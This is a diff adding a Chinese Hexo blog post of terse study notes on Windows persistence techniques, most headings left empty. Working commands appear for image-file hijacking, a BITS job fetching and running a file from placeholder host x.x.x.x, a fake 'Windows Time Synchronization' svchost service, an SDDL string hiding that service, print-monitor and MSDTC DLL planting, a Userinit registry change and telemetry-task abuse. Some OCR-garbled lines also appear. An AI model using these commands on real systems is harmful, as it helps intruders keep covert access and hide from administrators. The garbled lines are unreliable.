@@ -1,0 +1,532 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.jpg">
+  <link rel="icon" type="image/png" href="/img/favicon.jpg">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <title>windows权限维持 - CPLASF</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+<div id="dark" onclick="switchDarkMode()"></div>
+<script>
+  var isNight = new Date().getHours() >= 22 || new Date().getHours() < 7; // 指定时间
+  // 依次判断 系统暗黑模式 指定时间 缓存 dark
+  if( matchMedia('(prefers-color-scheme: dark)').matches || isNight || localStorage.getItem('dark') === '1') {
+    if(!(isNight&&localStorage.getItem('noDark') === '1')) {
+      document.body.classList.add('dark');
+    }
+  }
+  document.getElementById('dark').innerHTML = document.querySelector("body").classList.contains("dark")?"🌙":"🌞";
+</script>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>CPLASF</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="windows权限维持">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-12-28 12:55" pubdate>
+        2020年12月28日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.1k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      16
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">windows权限维持</h1>
+            
+            <div class="markdown-body">
+              <h1 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h1><h2 id="就简单列一下，后续学弟们学习的时候可以扩充一下"><a href="#就简单列一下，后续学弟们学习的时候可以扩充一下" class="headerlink" title="就简单列一下，后续学弟们学习的时候可以扩充一下"></a>就简单列一下，后续学弟们学习的时候可以扩充一下</h2><h2 id="启动项"><a href="#启动项" class="headerlink" title="启动项"></a>启动项</h2><h2 id="影子用户、账号克隆"><a href="#影子用户、账号克隆" class="headerlink" title="影子用户、账号克隆"></a>影子用户、账号克隆</h2><h2 id="outlook客户端rce"><a href="#outlook客户端rce" class="headerlink" title="outlook客户端rce"></a>outlook客户端rce</h2><p>使用客户端查看邮件时触发</p>
+<h2 id="注册键"><a href="#注册键" class="headerlink" title="注册键"></a>注册键</h2><h2 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a><strong>DLL劫持</strong></h2><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2718485/1608882275250-03229a68-0a04-48aa-8a73-26243806c705.png?x-oss-process=image/resize,w_1492" srcset="/img/loading.gif"></p>
+<p><strong><img src="https://cdn.nlark.com/yuque/0/2020/png/2718485/1608882355199-6a045ca0-6d5c-454a-8d8d-70ab3608b2b7.png?x-oss-process=image/resize,w_1492" srcset="/img/loading.gif"></strong></p>
+<p><strong>vscode:</strong></p>
+<p><strong>等以后李总用回windows，嘻嘻嘻</strong></p>
+<blockquote>
+<p>C:\Users\chentianchi\AppData\Local\Programs\Microsoft VS Code\WINSTA.dll</p>
+<p>C:\Users\chentianchi\AppData\Local\Programs\Microsoft VS Code\LINKINFO.dll</p>
+<p>C:\Users\chentianchi\AppData\Local\Programs\Microsoft VS Code\ntshrui.dll</p>
+<p>C:\Users\chentianchi\AppData\Local\Programs\Microsoft VS Code\srvcli.dll</p>
+<p>C:\Users\chentianchi\AppData\Local\Programs\Microsoft VS Code\cscapi.dll</p>
+</blockquote>
+<h2 id="映像劫持"><a href="#映像劫持" class="headerlink" title="映像劫持"></a>映像劫持</h2><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">REG ADD &quot;HKLM<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows NT<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\I</span>mage FileExecution Options<span class="hljs-symbol">\n</span>otepad.exe&quot; /t REG_SZ /v Debugger /d&quot;C:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\c</span>md.exe&quot; /f<br></code></pre></td></tr></table></figure>
+
+
+<h2 id="com劫持"><a href="#com劫持" class="headerlink" title="com劫持"></a>com劫持</h2><h2 id="BIT后门"><a href="#BIT后门" class="headerlink" title="BIT后门"></a>BIT后门</h2><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">bitsadmin <span class="hljs-string">/create</span> <br>testbitsadmin <span class="hljs-string">/addfile</span> test <span class="hljs-string">&quot;http://x.x.x.x/x &quot;</span><span class="hljs-string">//</span><span class="hljs-string">&quot;C:\tmp\xx&quot;</span><br>bitsadmin <span class="hljs-string">/SetNotifyCmdLine</span> test C:\tmp\xx NUL<br>bitsadmin <span class="hljs-string">/SetMinRetryDelay</span> <span class="hljs-string">&quot;test&quot;</span> 60<br></code></pre></td></tr></table></figure>
+<h2 id="屏幕保护"><a href="#屏幕保护" class="headerlink" title="屏幕保护"></a>屏幕保护</h2><h2 id="端口复用"><a href="#端口复用" class="headerlink" title="端口复用"></a>端口复用</h2><h2 id="快捷方式"><a href="#快捷方式" class="headerlink" title="快捷方式"></a>快捷方式</h2><h2 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h2><h4 id="svchost加载服务"><a href="#svchost加载服务" class="headerlink" title="svchost加载服务"></a>svchost加载服务</h4><p>免杀dll需免杀</p>
+<p>32</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">sc create TimeSync binPath= <span class="hljs-string">&quot;C:\Windows\System32\svchost.exe -k netsvr&quot;</span> start= auto obj= LocalSystem<br>reg add HKLM\SYSTEM\CurrentControlSet\services\TimeSync\Parameters <span class="hljs-string">/v</span> ServiceDll <span class="hljs-string">/t</span> REG_EXPAND_SZ <span class="hljs-string">/d</span> <span class="hljs-string">&quot;C:\Users\hunter\Desktop\localService32.dll&quot;</span> <span class="hljs-string">/f</span> <span class="hljs-string">/reg</span><span class="hljs-function">:32</span><br>reg add HKLM\SYSTEM\CurrentControlSet\services\TimeSync <span class="hljs-string">/v</span> Description <span class="hljs-string">/t</span> REG_SZ <span class="hljs-string">/d</span> <span class="hljs-string">&quot;Windows Time Synchronization Service&quot;</span> <span class="hljs-string">/f</span> <span class="hljs-string">/reg</span><span class="hljs-function">:32</span><br>reg add HKLM\SYSTEM\CurrentControlSet\services\TimeSync <span class="hljs-string">/v</span> DisplayName <span class="hljs-string">/t</span> REG_SZ <span class="hljs-string">/d</span> <span class="hljs-string">&quot;TimeSyncSrv&quot;</span> <span class="hljs-string">/f</span> <span class="hljs-string">/reg</span><span class="hljs-function">:32</span><br>reg add <span class="hljs-string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost&quot;</span> <span class="hljs-string">/v</span> netsvr <span class="hljs-string">/t</span> REG_MULTI_SZ <span class="hljs-string">/d</span> TimeSync <span class="hljs-string">/f</span> <span class="hljs-string">/reg</span><span class="hljs-function">:32</span><br>sc start TimeSync<br></code></pre></td></tr></table></figure>
+<p>64注册32</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">sc create TimeSync binPath= <span class="hljs-string">&quot;C:\Windows\Syswow64\svchost.exe -k netsvr&quot;</span> start= auto obj= LocalSystem<br>reg add HKLM\SYSTEM\CurrentControlSet\services\TimeSync\Parameters <span class="hljs-string">/v</span> ServiceDll <span class="hljs-string">/t</span> REG_EXPAND_SZ <span class="hljs-string">/d</span> <span class="hljs-string">&quot;C:\Users\hunter\Desktop\localService32.dll&quot;</span> <span class="hljs-string">/f</span> <span class="hljs-string">/reg</span><span class="hljs-function">:32</span><br>reg add HKLM\SYSTEM\CurrentControlSet\services\TimeSync <span class="hljs-string">/v</span> Description <span class="hljs-string">/t</span> REG_SZ <span class="hljs-string">/d</span> <span class="hljs-string">&quot;Windows Time Synchronization Service&quot;</span> <span class="hljs-string">/f</span> <span class="hljs-string">/reg</span><span class="hljs-function">:32</span><br>reg add HKLM\SYSTEM\CurrentControlSet\services\TimeSync <span class="hljs-string">/v</span> DisplayName <span class="hljs-string">/t</span> REG_SZ <span class="hljs-string">/d</span> <span class="hljs-string">&quot;TimeSyncSrv&quot;</span> <span class="hljs-string">/f</span> <span class="hljs-string">/reg</span><span class="hljs-function">:32</span><br>reg add <span class="hljs-string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost&quot;</span> <span class="hljs-string">/v</span> netsvr <span class="hljs-string">/t</span> REG_MULTI_SZ <span class="hljs-string">/d</span> TimeSync <span class="hljs-string">/f</span> <span class="hljs-string">/reg</span><span class="hljs-function">:32</span><br>sc start TimeSync<br></code></pre></td></tr></table></figure>
+<p>64</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">sc create TimeSync binPath= <span class="hljs-string">&quot;C:\Windows\System32\svchost.exe -k netsvr&quot;</span> start= auto obj= LocalSystem<br>reg add HKLM\SYSTEM\CurrentControlSet\services\TimeSync\Parameters <span class="hljs-string">/v</span> ServiceDll <span class="hljs-string">/t</span> REG_EXPAND_SZ <span class="hljs-string">/d</span> <span class="hljs-string">&quot;C:\Users\hunter\Desktop\localService32.dll&quot;</span> <span class="hljs-string">/f</span> <span class="hljs-string">/reg</span><span class="hljs-function">:64</span><br>reg add HKLM\SYSTEM\CurrentControlSet\services\TimeSync <span class="hljs-string">/v</span> Description <span class="hljs-string">/t</span> REG_SZ <span class="hljs-string">/d</span> <span class="hljs-string">&quot;Windows Time Synchronization Service&quot;</span> <span class="hljs-string">/f</span> <span class="hljs-string">/reg</span><span class="hljs-function">:64</span><br>reg add HKLM\SYSTEM\CurrentControlSet\services\TimeSync <span class="hljs-string">/v</span> DisplayName <span class="hljs-string">/t</span> REG_SZ <span class="hljs-string">/d</span> <span class="hljs-string">&quot;TimeSyncSrv&quot;</span> <span class="hljs-string">/f</span> <span class="hljs-string">/reg</span><span class="hljs-function">:64</span><br>reg add <span class="hljs-string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost&quot;</span> <span class="hljs-string">/v</span> netsvr <span class="hljs-string">/t</span> REG_MULTI_SZ <span class="hljs-string">/d</span> TimeSync <span class="hljs-string">/f</span> <span class="hljs-string">/reg</span><span class="hljs-function">:64</span><br>sc start TimeSync<br></code></pre></td></tr></table></figure>
+<h4 id="隐藏服务"><a href="#隐藏服务" class="headerlink" title="隐藏服务"></a>隐藏服务</h4><p>注册服务：（以管理员权限）</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/2718485/1608554908329-1ad2b788-b2d2-418f-97a3-005e37818855.png" srcset="/img/loading.gif"></p>
+<p>system32&gt;sccreateteststartautobinathdx</p>
+<p>Windows</p>
+<p>Pam</p>
+<p>depend-Tcpipobj-Localsyste</p>
+<p>i1essBuiidartifactexed</p>
+<p>Createseruice成功</p>
+<p>[SC]</p>
+<p>syTen32&gt;</p>
+<p>Windows</p>
+<p>比较容易被检测，查看该服务信息：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/2718485/1608555034571-b8e9b77d-3913-45c8-a72c-dd5cbc6f34c6.png" srcset="/img/loading.gif" alt="image.png"></p>
+<p>隐藏服务</p>
+<blockquote>
+<p>sc.exe sdset test “D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)”</p>
+</blockquote>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/2718485/1608555396533-6a2f79c1-4953-4cfa-956e-71998513fb51.png" srcset="/img/loading.gif"></p>
+<p>结果：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/2718485/1608555716877-802a902a-bb8b-4168-8812-94cf5e43725f.png" srcset="/img/loading.gif"></p>
+<p>具体参见SDDL语法：</p>
+<blockquote>
+<p>D:(D;;DCLCWPDTSD;;;IU)  //拒绝交互登陆用户的服务配置、查询、状态查询、暂停和删除权限</p>
+<p>(D;;DCLCWPDTSD;;;SU)   //拒绝登陆用户的服务配置、查询、状态查询、暂停和删除权限</p>
+<p>(D;;DCLCWPDTSD;;;BA)   //拒绝认证用户的服务配置、查询、状态查询、暂停和删除权限</p>
+</blockquote>
+<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h2><h2 id="wmi"><a href="#wmi" class="headerlink" title="wmi"></a>wmi</h2><h2 id="屏幕保护-1"><a href="#屏幕保护-1" class="headerlink" title="屏幕保护"></a>屏幕保护</h2><h2 id="后台智能传输服务"><a href="#后台智能传输服务" class="headerlink" title="后台智能传输服务"></a>后台智能传输服务</h2><h2 id="后台打印服务"><a href="#后台打印服务" class="headerlink" title="后台打印服务"></a>后台打印服务</h2><p>管理员</p>
+<p>reg add “hklm\system\currentcontrolset\control\print\monitors\monitor” /v “Driver” /d “恶意.dll” /t REG_SZ</p>
+<h2 id="Netsh"><a href="#Netsh" class="headerlink" title="Netsh"></a>Netsh</h2><h2 id="AppCertDlls"><a href="#AppCertDlls" class="headerlink" title="AppCertDlls"></a>AppCertDlls</h2><h2 id="MSDTC"><a href="#MSDTC" class="headerlink" title="MSDTC"></a>MSDTC</h2><h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2718485/1608541604713-a17db73a-776e-44da-a970-0a6ad007e8c0.png?x-oss-process=image/resize,w_1492" srcset="/img/loading.gif"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/2718485/1608541659647-ab120c1d-758a-468e-a573-b2732e71bc28.png" srcset="/img/loading.gif"></p>
+<p>MSDTC服务中的MTxOCI组件搜索三个DLL：oci.dll，SQLLib80.dll和xa80.dll。Windows系统默认不包含oci.dll。  </p>
+<p>我们将后门dll将其重命名为oci.dll，并将其放置在%SystemRoot%\system32\中</p>
+<p>taskkill /f /im msdtc.exe  关闭服务</p>
+<p>重启   </p>
+<h2 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h2><h2 id="clr"><a href="#clr" class="headerlink" title="clr"></a>clr</h2><h2 id="用户初始化"><a href="#用户初始化" class="headerlink" title="用户初始化"></a>用户初始化</h2><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2718485/1608542075183-16a37e33-63cb-460d-8899-3e5c99a7620b.png?x-oss-process=image/resize,w_1492" srcset="/img/loading.gif"></p>
+<p>权限较高可直接修改</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/2718485/1608542108019-44624ad3-b2b4-407e-80b4-a5da3ffd5d08.png" srcset="/img/loading.gif"></p>
+<p>或者使用powershell拿到高权限的shell</p>
+<blockquote>
+<p>echo Set-ItemProperty “HKLM:\SOFTWARE\Microsoft\WINDOWS NT\CurrentVersion\Winlogon” -name Userinit -value “C:\Windows\system32\userinit.exe,C:\Windows\system32\calc.exe” &gt; system.ps1</p>
+<p>PowerShell.exe -ExecutionPolicy Bypass system.ps1</p>
+</blockquote>
+<h2 id="时间管理器"><a href="#时间管理器" class="headerlink" title="时间管理器"></a>时间管理器</h2><h2 id="windows更新"><a href="#windows更新" class="headerlink" title="windows更新"></a>windows更新</h2><p>C:\Windows\System32\wuauclt.exe</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">wuauclt.exe <span class="hljs-regexp">/UpdateDeploymentProvider &lt;Full_Path_To_DLL&gt; /</span>RunHandlerComServer<br></code></pre></td></tr></table></figure>
+
+
+<h2 id="滥用WINDOWS-TELEMETRY"><a href="#滥用WINDOWS-TELEMETRY" class="headerlink" title="滥用WINDOWS TELEMETRY"></a>滥用WINDOWS TELEMETRY</h2><p>在注册表</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indowsNT<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\A</span>ppCompatFlags<span class="hljs-symbol">\T</span>elemetryController<br></code></pre></td></tr></table></figure>
+
+
+<p>添加任意命名子项。添加名称为Command 类型是REG_SZ ，Data value填写我们要执行的exe程序；</p>
+<p>创建一个DWORD的KEY，名称可以为Nightly，Oobe，Maintanance并将它们的值设置成1。Nightly模式会以每24小时执行一次。</p>
+<p>或者使用下列命令保存文本（以nightly为例），修改reg格式导入即可</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">[HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indowsNT<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\A</span>ppCompatFlags<span class="hljs-symbol">\T</span>elemetryController<span class="hljs-symbol">\t</span>est]&quot;Command&quot;=&quot;c:<span class="hljs-symbol">\\</span>windows<span class="hljs-symbol">\\</span>system32<span class="hljs-symbol">\\</span>notepad.exe&quot;&quot;Nightly&quot;=dword:00000001<br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/2718485/1608738031148-66b70c42-744d-49ce-9af4-fc614f0c360d.png" srcset="/img/loading.gif"></p>
+<p>如果想立即执行查看效果可以在Cortana搜索框中输入“任务计划”，打开“任务计划程序”，在左侧的导航窗格中依次展开定位至“任务计划程序库</p>
+<p>或者管理员直接运行</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">schtasks /run /tn &quot;<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\A</span>pplication Experience<span class="hljs-symbol">\M</span>icrosoftCompatibility Appraiser&quot;<br></code></pre></td></tr></table></figure>
+
+
+<h2 id="windows-terminal"><a href="#windows-terminal" class="headerlink" title="windows terminal"></a>windows terminal</h2><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/PaHdUV3omiFQt7qV5bnTzA">https://mp.weixin.qq.com/s/PaHdUV3omiFQt7qV5bnTzA</a></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/2718485/1608738721397-74a4d747-1f9e-4955-b845-1856205a4418.png" srcset="/img/loading.gif"></p>
+<h2 id="AMSI"><a href="#AMSI" class="headerlink" title="AMSI"></a>AMSI</h2>
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/12/28/hello-world/">
+                        <span class="hidden-mobile">Hello World</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
